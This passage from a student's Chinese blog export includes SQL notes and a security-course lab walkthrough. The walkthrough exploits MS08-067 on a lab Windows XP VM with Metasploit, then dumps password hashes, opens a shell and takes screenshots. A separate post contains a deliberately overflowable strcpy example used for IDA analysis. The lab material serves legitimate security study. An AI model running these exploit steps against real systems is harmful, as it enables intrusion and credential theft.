<h3 id="GROUP-BY"><a href="#GROUP-BY" class="headerlink" title="GROUP BY"></a>GROUP BY</h3><p>分组运算在积运算和投影运算之后进行</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>	beer,<span class="keyword">AVG</span>(price)</span><br><span class="line"><span class="keyword">FROM</span>	sells</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span>	beer; <span class="comment">-- 获得每种啤酒的平均价格</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 每个员工做几个项目</span></span><br><span class="line"><span class="keyword">SELECT</span>	empno,<span class="keyword">count</span>(*)</span><br><span class="line"><span class="keyword">FROM</span>	workson</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span>	empno;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 每个项目由几名员工完成</span></span><br><span class="line"><span class="keyword">SELECT</span>	projectno,<span class="keyword">count</span>(*)</span><br><span class="line"><span class="keyword">FROM</span>	workson</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span>	projectno;</span><br></pre></td></tr></table></figure>

<p>NULL单独作为一个分组</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1998.04.15后入职员工所参与项目的平均预算</span></span><br><span class="line"><span class="keyword">SELECT</span>	empno,<span class="keyword">avg</span>(budget)</span><br><span class="line"><span class="keyword">FROM</span>	workson,<span class="keyword">project</span></span><br><span class="line"><span class="keyword">WHERE</span>	workson.projectno=project.projectno</span><br><span class="line">		<span class="keyword">and</span> <span class="built_in">date</span>&gt;<span class="string">'1998-04-15'</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span>	empno;</span><br></pre></td></tr></table></figure>

<h3 id="MIN"><a href="#MIN" class="headerlink" title="MIN"></a>MIN</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>	<span class="keyword">min</span>(budget)</span><br><span class="line"><span class="keyword">FROM</span>	<span class="keyword">project</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查找bud的最低价格,不能得到正确结果</span></span><br><span class="line"><span class="keyword">SELECT</span>	bar,<span class="keyword">min</span>(price)</span><br><span class="line"><span class="keyword">FROM</span>	sells</span><br><span class="line"><span class="keyword">WHERE</span>	beer=<span class="string">'Bud'</span>;</span><br><span class="line"><span class="comment">-- 应该写为</span></span><br><span class="line"><span class="keyword">SELECT</span>	bar</span><br><span class="line"><span class="keyword">FROM</span>	sells</span><br><span class="line"><span class="keyword">WHERE</span>	beer=<span class="string">'Bud'</span> <span class="keyword">and</span> </span><br><span class="line">		price&lt;=<span class="keyword">ALL</span>(<span class="keyword">SELECT</span>	price</span><br><span class="line">					<span class="keyword">FROM</span>	sells</span><br><span class="line">					<span class="keyword">WHERE</span>	beer=<span class="string">'Bud'</span>);</span><br></pre></td></tr></table></figure>

<h3 id="Having"><a href="#Having" class="headerlink" title="Having"></a>Having</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>	beer,<span class="keyword">AVG</span>(price)</span><br><span class="line"><span class="keyword">FROM</span>	sells</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span>	beer <span class="comment">-- having 添加group条件，至少在三家酒吧售卖或由B公司制造</span></span><br><span class="line"><span class="keyword">HAVING</span>	<span class="keyword">COUNT</span>(*)&gt;=<span class="number">3</span> <span class="keyword">OR</span> <span class="comment">--针对group by中的属性</span></span><br><span class="line">		beer	<span class="keyword">IN</span>	(<span class="keyword">SELECT</span> <span class="keyword">name</span>	</span><br><span class="line">		<span class="comment">-- 只有group by中的属性，才能以非聚合形式出现在having中</span></span><br><span class="line">					<span class="keyword">FROM</span>	beers</span><br><span class="line">					<span class="keyword">WHERE</span>	manf=<span class="string">'Busch'</span>);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞测试作业八：攻破XP</title>
    <url>/2020/05/21/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><div class="note primary no-icon">
            <ul><li>kali linux</li><li>nessus</li><li>metasploit</li><li>ms08_067利用</li></ul>
          </div>



<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>在KALI中安装NESSUS，对目标XP SP3主机进行扫描；根据扫描得到的漏洞结果利用metasploit框架（命令行模式）完成利用，对XP主机（关闭系统的安全防护措施）实施渗透攻击：</p>
<p>（1）熟练掌握metasploit中的常见指令</p>
<p>（2）攻击效果应该能获取XP主机的屏幕截图（屏幕截图个性化，比如用记事本打开输入个人学号等信息），并将截图作为实验报告的一部分提交</p>
<p>（3）Armitage工具的渗透过程可以基于命令行的操作基础上自己实践</p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="0-Nessus安装"><a href="#0-Nessus安装" class="headerlink" title="(0) Nessus安装"></a>(0) Nessus安装</h3><h4 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h4><p>在<a href="https://www.tenable.com/downloads/nessus下载对应安装包，本人使用的是61为kali" target="_blank" rel="noopener">https://www.tenable.com/downloads/nessus下载对应安装包，本人使用的是61为kali</a> linux，下载的是<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业八/image-20200517163539088.png"  alt="image-20200517163539088" style="zoom:80%;"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压安装包</span></span><br><span class="line">sudo dpkg -i Nessus-8.10.0-debian6_amd64.deb</span><br><span class="line"><span class="comment"># 启动服务</span></span><br><span class="line">/etc/init.d/nessusd start</span><br><span class="line"><span class="comment"># 查看服务</span></span><br><span class="line">sudo netstat -ntpl | grep nessus</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AB/image-20200519163250802.png"  alt="image-20200519163250802"></p>
<p>表示安装成功</p>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>在浏览器中输入<a href="https://localhost:8834/,点击```Advanced```,根据提示输入激活码,设置账户root,密码123456" target="_blank" rel="noopener">https://localhost:8834/,点击```Advanced```,根据提示输入激活码,设置账户root,密码123456</a></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业八/image-20200519164230839.png"  alt="image-20200519164230839" style="zoom:50%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业八/image-20200519164404837.png"  alt="image-20200519164404837" style="zoom: 33%;"></p>
<p>使用浏览器更新插件易出现卡死情况,这时候需要用命令行手动更新</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo /opt/nessus/sbin/nessuscli update --plugins-only</span><br></pre></td></tr></table></figure>

<p>重启服务</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo /etc/init.d/nessusd restart</span><br></pre></td></tr></table></figure>

<p>安装成功</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业八/image-20200519215331129.png"  alt="image-20200519215331129" style="zoom:50%;">

<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业八/image-20200519215636880.png"  alt="image-20200519215636880" style="zoom: 50%;">

<h3 id="1-metasploit常见指令"><a href="#1-metasploit常见指令" class="headerlink" title="(1) metasploit常见指令"></a>(1) metasploit常见指令</h3><table>
<thead>
<tr>
<th>指令</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>back</td>
<td>跳出当前模块</td>
</tr>
<tr>
<td>show exploits</td>
<td>显示metasploit框架中所有课用的渗透攻击模块</td>
</tr>
<tr>
<td></td>
<td>主动型exploits能够直接连接并攻击特定主机</td>
</tr>
<tr>
<td></td>
<td>被动性exploits等待主机连接之后对其进行渗透攻击</td>
</tr>
<tr>
<td>show auxiliary</td>
<td>显示所有的辅助模块以及它们的用途<br>Metasploit中，辅助模块可以是扫描器、拒绝服务攻击工具、Fuzz测试器以及其它类型的工具</td>
</tr>
<tr>
<td>show options</td>
<td>参数options是保证框架哥哥模块正确运行所需要的各种设置，这个命令会列出所需参数</td>
</tr>
<tr>
<td>show payloads</td>
<td>攻击载荷是针对特定平台的一段攻击代码，他将通过网络传送到攻击目标进行执行</td>
</tr>
<tr>
<td>use</td>
<td>找到攻击模块或者payloads后，可以使用use命令加载模块</td>
</tr>
<tr>
<td>show targets</td>
<td>列出受到漏洞影响的目标系统的类型</td>
</tr>
<tr>
<td>info</td>
<td>info+模块名 给出此模块的详细信心、参数说明以及所有课用的目标操作系统</td>
</tr>
<tr>
<td>check</td>
<td>检测目标主机是否存在指定漏洞</td>
</tr>
<tr>
<td>set</td>
<td>针对某个参数进行设置（同时启动该参数）</td>
</tr>
<tr>
<td>unset</td>
<td>禁用相关参数</td>
</tr>
</tbody></table>
<h3 id="2-扫描目标XP-SP3主机"><a href="#2-扫描目标XP-SP3主机" class="headerlink" title="(2) 扫描目标XP SP3主机"></a>(2) 扫描目标XP SP3主机</h3><h4 id="查看xp的ip地址"><a href="#查看xp的ip地址" class="headerlink" title="查看xp的ip地址"></a>查看xp的ip地址</h4><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业八/image-20200519172427020.png"  alt="image-20200519172427020" style="zoom:67%;">

<p>得到ip地址: 192.168.89.141</p>
<h4 id="使用nessus扫描"><a href="#使用nessus扫描" class="headerlink" title="使用nessus扫描"></a>使用nessus扫描</h4><p>new scan  -&gt;   advanced scan</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AB/image-20200519220049513.png"  alt="image-20200519220049513"></p>
<p>点击<code>save</code><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业八/image-20200520172918075.png"  alt="image-20200520172918075" style="zoom:67%;">启动扫描</p>
<p>下面利用漏洞ms08_067</p>
<h4 id="使用metasploit"><a href="#使用metasploit" class="headerlink" title="使用metasploit"></a>使用metasploit</h4><h5 id="xp关闭防火墙并打开445端口"><a href="#xp关闭防火墙并打开445端口" class="headerlink" title="==xp关闭防火墙并打开445端口=="></a>==xp关闭防火墙并打开445端口==</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">telnet 192.168.89.141 445</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AB/image-20200520205402500.png"  alt="image-20200520205402500">445端口打开</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AB/image-20200520205451056.png"  alt="image-20200520205451056">445端口关闭</p>
<p>（本系统的445端口默认关闭）</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业八/image-20200520205606131.png"  alt="image-20200520205606131" style="zoom:100%;">防火墙和自动更新已关闭</p>
<h5 id="打开metasploit"><a href="#打开metasploit" class="headerlink" title="打开metasploit"></a>打开metasploit</h5><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业八/image-20200519220205462.png"  alt="image-20200519220205462" style="zoom:67%;">

<h5 id="查看对应漏洞相关攻击模块"><a href="#查看对应漏洞相关攻击模块" class="headerlink" title="查看对应漏洞相关攻击模块"></a>查看对应漏洞相关攻击模块</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">search ms08_067</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AB/image-20200520193348371.png"  alt="image-20200520193348371"></p>
<h5 id="选定要进行渗透的攻击模块"><a href="#选定要进行渗透的攻击模块" class="headerlink" title="选定要进行渗透的攻击模块"></a>选定要进行渗透的攻击模块</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AB/image-20200520193654664.png"  alt="image-20200520193654664"></p>
<h5 id="查看模块有关选项"><a href="#查看模块有关选项" class="headerlink" title="查看模块有关选项"></a>查看模块有关选项</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AB/image-20200520194020076.png"  alt="image-20200520194020076"></p>
<h5 id="设定攻击目标"><a href="#设定攻击目标" class="headerlink" title="设定攻击目标"></a>设定攻击目标</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOST 192.168.89.141</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AB/image-20200520194221871.png"  alt="image-20200520194221871"></p>
<h5 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AB/image-20200520210231512.png"  alt="image-20200520210231512"></p>
<p>攻击成功</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业八/image-20200520210303096.png"  alt="image-20200520210303096" style="zoom:80%;">

<h5 id="利用漏洞对目标主机进行控制"><a href="#利用漏洞对目标主机进行控制" class="headerlink" title="利用漏洞对目标主机进行控制"></a>利用漏洞对目标主机进行控制</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">show payloads</span><br></pre></td></tr></table></figure>

<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业八/image-20200520210905926.png"  alt="image-20200520210905926" style="zoom:67%;">

<h5 id="使用正向连接shell"><a href="#使用正向连接shell" class="headerlink" title="使用正向连接shell"></a>使用正向连接shell</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set payload windows&#x2F;meterpreter&#x2F;bind_tcp</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AB/image-20200520211948981.png"  alt="image-20200520211948981"></p>
<p>show options查看该攻击载荷有无其它要求</p>
<h5 id="设置系统版本号"><a href="#设置系统版本号" class="headerlink" title="设置系统版本号"></a>设置系统版本号</h5><p>XP sp3 中文简体办-&gt;34</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> target 34</span><br></pre></td></tr></table></figure>

<h5 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AB/image-20200520212928849.png"  alt="image-20200520212928849"></p>
<p>攻击成功</p>
<h5 id="得到用户信息"><a href="#得到用户信息" class="headerlink" title="得到用户信息"></a>得到用户信息</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hashdump</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AB/image-20200520213231876.png"  alt="image-20200520213231876"></p>
<h5 id="获取目标主机的控制权"><a href="#获取目标主机的控制权" class="headerlink" title="获取目标主机的控制权"></a>获取目标主机的控制权</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>

<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业八/image-20200520213432872.png"  alt="image-20200520213432872" style="zoom:70%;">

<h5 id="浏览目标主机目录"><a href="#浏览目标主机目录" class="headerlink" title="浏览目标主机目录"></a>浏览目标主机目录</h5><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业八/image-20200520213543124.png"  alt="image-20200520213543124" style="zoom:50%;">

<h5 id="退回meterpreter"><a href="#退回meterpreter" class="headerlink" title="退回meterpreter"></a>退回meterpreter</h5><p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AB/image-20200520213721875.png"  alt="image-20200520213721875"></p>
<h5 id="屏幕快照"><a href="#屏幕快照" class="headerlink" title="屏幕快照"></a>屏幕快照</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">screenshot</span><br></pre></td></tr></table></figure>

<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业八/image-20200520214041538.png"  alt="image-20200520214041538" style="zoom:67%;">

<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/05/21/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AB/blog\hexo\source\_posts\漏测作业八\image-20200521160637123.png"  alt="image-20200521160637123" style="zoom: 50%;">

]]></content>
      <categories>
        <category>漏洞测试作业</category>
      </categories>
      <tags>
        <tag>漏洞测试</tag>
        <tag>kali linux</tag>
        <tag>nessus</tag>
        <tag>metasploit</tag>
        <tag>ms08_067</tag>
      </tags>
  </entry>
  <entry>
    <title>虚拟机复制后无法连网</title>
    <url>/2020/05/20/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%A4%8D%E5%88%B6%E5%90%8E%E6%97%A0%E6%B3%95%E8%BF%9E%E7%BD%91/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>虚拟机设置-&gt;移除网络适配器-&gt;添加网络适配器</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/虚拟机复制后无法连网.assets/image-20200520183137820.png"  alt="image-20200520183137820" style="zoom: 33%;">]]></content>
      <categories>
        <category>vmware</category>
      </categories>
      <tags>
        <tag>虚拟机</tag>
        <tag>kali linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali 基础命令</title>
    <url>/2020/05/19/KaliLinux%E6%8C%87%E4%BB%A4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><table>
<thead>
<tr>
<th>Kali 基础命令</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>ls</td>
<td>显示文件或目录</td>
</tr>
<tr>
<td>mkdir</td>
<td>创建目录</td>
</tr>
<tr>
<td>cd</td>
<td>切换目录</td>
</tr>
<tr>
<td>touch</td>
<td>创建空目录</td>
</tr>
<tr>
<td>cat</td>
<td>查看空文件</td>
</tr>
<tr>
<td>cp</td>
<td>拷贝</td>
</tr>
<tr>
<td>mv</td>
<td>移动或重命名</td>
</tr>
<tr>
<td>find</td>
<td>在文件系统中搜索某文件</td>
</tr>
<tr>
<td>stat</td>
<td>显示指定文件的详细信息<br>比ls更详细</td>
</tr>
<tr>
<td>who</td>
<td>显示在线登录用户</td>
</tr>
<tr>
<td>whoami</td>
<td>显示当前操作用户</td>
</tr>
<tr>
<td>hostname</td>
<td>显示主机名</td>
</tr>
<tr>
<td>unanme</td>
<td>显示系统信息</td>
</tr>
<tr>
<td>top</td>
<td>动态显示当前耗费资源最多进程信息</td>
</tr>
<tr>
<td>ps</td>
<td>显示瞬间进程状态<code>ps -aux</code></td>
</tr>
<tr>
<td>du</td>
<td>查看目录大小 <code>du -h /home</code>带有单位显示目录信息</td>
</tr>
<tr>
<td>df</td>
<td>查看磁盘大小<code>df -h</code>带有单位显示磁盘信息</td>
</tr>
<tr>
<td>ifconfig</td>
<td>查看网络情况</td>
</tr>
<tr>
<td>ping</td>
<td>测试网络连通</td>
</tr>
<tr>
<td>netstat</td>
<td>显示网络状态信息</td>
</tr>
<tr>
<td>man</td>
<td>查看命令使用方法,如<code>man ls</code></td>
</tr>
<tr>
<td>clear</td>
<td>清屏</td>
</tr>
<tr>
<td>kill</td>
<td>杀死进程,可以先用<code>ps</code>或<code>top</code>命令查看进程的id,然后再用kill命令杀死进程</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>信安</category>
      </categories>
      <tags>
        <tag>漏洞测试</tag>
        <tag>Kali Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞测试作业七：漏洞挖掘示例</title>
    <url>/2020/05/15/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%83/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>模糊测试和Fuzzer编写</p>
<h2 id="在CP-VC6生成课本示例6-1的案例（RELEASE模式）"><a href="#在CP-VC6生成课本示例6-1的案例（RELEASE模式）" class="headerlink" title="在CP VC6生成课本示例6-1的案例（RELEASE模式）"></a>在CP VC6生成课本示例6-1的案例（RELEASE模式）</h2><p>注意修改char des[5]为char des[20]: </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//课本示例6-1</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">makeoverflow</span><span class="params">(<span class="keyword">char</span>* b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> des[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(des,b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc&gt;<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(argv[<span class="number">1</span>],<span class="string">"overflow"</span>)!=<span class="number">0</span>)<span class="comment">// strstr(str1,str2) 函数用于判断字符串str2是否是str1的子串。</span></span><br><span class="line">        	makeoverflow(argv[<span class="number">2</span>]);    <span class="comment">// 在cmd中运行，arg[0]为可执行文件名 </span></span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">        	<span class="built_in">printf</span>(<span class="string">"usage:findoverflow XXXX\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>生成程序的Release版本</p>
 <img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业七/image-20200504180709347.png"  alt="image-20200504180709347" style="zoom:50%;">

<h2 id="1-通过IDA此法分析的手段来实现漏洞挖掘"><a href="#1-通过IDA此法分析的手段来实现漏洞挖掘" class="headerlink" title="(1)通过IDA此法分析的手段来实现漏洞挖掘"></a>(1)通过IDA此法分析的手段来实现漏洞挖掘</h2><h3 id="1-使用逆向分析工具IDA，得到反汇编后的执行代码"><a href="#1-使用逆向分析工具IDA，得到反汇编后的执行代码" class="headerlink" title="1. 使用逆向分析工具IDA，得到反汇编后的执行代码"></a>1. 使用逆向分析工具IDA，得到反汇编后的执行代码</h3><h4 id="1-利用IDA打开所生成的EXE文件，view-gt-subviews-gt-proximity-browser"><a href="#1-利用IDA打开所生成的EXE文件，view-gt-subviews-gt-proximity-browser" class="headerlink" title="1)  利用IDA打开所生成的EXE文件，view-&gt;subviews-&gt;proximity browser"></a>1)  利用IDA打开所生成的EXE文件，<code>view</code>-&gt;<code>subviews</code>-&gt;<code>proximity browser</code></h4><p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%83/image-20200507010506796.png"  alt="image-20200507010506796"></p>
<p>   通过该视图，可见主要有一个<code>main</code>函数，在该函数中可能有跳转，调用<code>sub_401000</code>函数、<code>_strstr</code>函数和<code>printf</code>函数，此外还定义了两个字符串常量<code>aUsageFindoverf</code>、<code>aOverflow</code></p>
<h4 id="2-右键点击aUsageFindoverflow-gt-text-view，可以看到如下代码"><a href="#2-右键点击aUsageFindoverflow-gt-text-view，可以看到如下代码" class="headerlink" title="2) 右键点击aUsageFindoverflow-&gt;text view，可以看到如下代码"></a>2) 右键点击<code>aUsageFindoverflow</code>-&gt;text view，可以看到如下代码</h4>   <img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业七/image-20200504174255233.png"  alt="image-20200504174255233" style="zoom:80%;">

<h4 id="3-右键点击-main-gt-graph-view-查看main函数的汇编代码块"><a href="#3-右键点击-main-gt-graph-view-查看main函数的汇编代码块" class="headerlink" title="3) 右键点击_main-&gt;graph view,查看main函数的汇编代码块"></a>3) 右键点击<code>_main</code>-&gt;<code>graph view</code>,查看<code>main</code>函数的汇编代码块</h4>   <img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业七/image-20200507010605173.png"  alt="image-20200507010605173" style="zoom:80%;">

<h3 id="2-定位敏感函数，也就是容易出现溢出的函数"><a href="#2-定位敏感函数，也就是容易出现溢出的函数" class="headerlink" title="2. 定位敏感函数，也就是容易出现溢出的函数"></a>2. 定位敏感函数，也就是容易出现溢出的函数</h3><blockquote>
<p>==arg_x表示函数参数x的位置，var_8表示局部变量的位置==<br>==[]是内存寻址，[x+arg_x]表示arg_x的值==</p>
<p>==realease版本简洁、执行效率先==<br>==debug版本严格按照语法结构，增加了很多方便调试的附加信息==</p>
</blockquote>
<ul>
<li><p>在主函数中，<code>printf</code>函数可能与==字符串格式化漏洞==有关，但通过分析主函数的汇编代码，可以看出该函数并无任何格式化参数存在</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业七/image-20200504181201589.png"  alt="image-20200504181201589" style="zoom:80%;">

<p>有格式化字符串的<code>printf</code>函数：<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业七/image-20200504182759080.png"  alt="image-20200504182759080" style="zoom:80%;"></p>
</li>
<li><p>敏感函数可能存在于<code>sub_401000</code>函数中</p>
<p>==为什么var_14是14？，和char des[20]是否有关？？？==</p>
</li>
</ul>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业七/image-20200507000054484.png"  alt="image-20200507000054484" style="zoom: 67%;">

<p>  sub40100函数的代码大致结构如下</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sub_40100(arg_0)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">char</span> var_14[<span class="number">14</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(var_14,arg_0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
